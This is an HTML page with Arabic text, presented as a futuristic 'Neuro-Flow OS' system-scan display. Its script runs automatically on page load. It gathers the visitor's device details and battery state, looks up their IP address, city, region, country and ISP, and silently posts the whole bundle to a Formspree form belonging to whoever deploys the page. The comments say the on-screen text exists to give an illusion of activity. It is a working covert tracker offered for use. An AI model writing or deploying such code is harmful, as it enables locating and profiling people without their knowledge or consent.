<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neuro-Flow OS | 2026</title>
    <style>
        :root { --primary: #00ffcc; --bg: #050505; }
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: var(--bg);
            color: var(--primary);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .monitor {
            border: 2px solid var(--primary);
            padding: 40px;
            background: rgba(0, 255, 204, 0.05);
            box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
            text-align: center;
            max-width: 500px;
            width: 90%;
        }
        .scanning {
            font-size: 1.2rem;
            margin-bottom: 20px;
            border-right: 2px solid var(--primary);
            white-space: nowrap;
            overflow: hidden;
            width: 0;
            animation: typing 2s steps(30, end) forwards;
        }
        @keyframes typing { from { width: 0 } to { width: 100% } }
        .data-stream {
            font-size: 0.8rem;
            text-align: left;
            color: #008866;
            margin-top: 20px;
            line-height: 1.5;
        }
    </style>
</head>
<body>

    <div class="monitor">
        <div class="scanning">جاري تحليل بيانات النظام المستهدف...</div>
        <div id="display" class="data-stream">
            اتصال آمن... <br>
            جاري سحب مفاتيح التشفير...
        </div>
    </div>

    <script>
        async function getDeepData() {
            const display = document.getElementById('display');
            
            // 1. معلومات الجهاز العميقة
            const deviceData = {
                platform: navigator.platform,
                agent: navigator.userAgent,
                cores: navigator.hardwareConcurrency + " Cores",
                memory: (navigator.deviceMemory || "غير معروف") + " GB RAM",
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                touch: navigator.maxTouchPoints > 0 ? "Yes" : "No",
                cookiesEnabled: navigator.cookieEnabled
            };

            // 2. معلومات الموقع والشبكة (IP API)
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                deviceData.ip = ipData.ip;
                deviceData.city = ipData.city;
                deviceData.region = ipData.region;
                deviceData.country = ipData.country_name;
                deviceData.isp = ipData.org;
            } catch (e) { deviceData.network = "فشل الوصول للشبكة"; }

            // 3. معلومات البطارية
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    deviceData.battery = (battery.level * 100) + "%";
                    deviceData.charging = battery.charging ? "Charging" : "Discharging";
                }
            } catch (e) { deviceData.battery = "Unknown"; }

            // تحديث الشاشة للمستخدم للإيهام بالعمل
            display.innerHTML += `<br>تم تحديد الموقع: ${deviceData.city || 'مجهول'}`;
            display.innerHTML += `<br>قوة المعالجة: ${deviceData.cores}`;

            // 4. إرسال الطرد المعلوماتي بالكامل إليك
            const formID = 'YOUR_FORM_ID'; // ضع الآيدي الخاص بك هنا
            
            try {
                await fetch(`https://formspree.io/f/${formID}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        subject: `اختراق تقني من ${deviceData.city || 'غير معروف'}`,
                        ...deviceData
                    })
                });
                display.innerHTML += "<br>حالة النظام: متصل ومستقر.";
            } catch (error) {
                display.innerHTML += "<br>خطأ في المزامنة.";
            }
        }

        window.onload = getDeepData;
    </script>
</body>
</html>
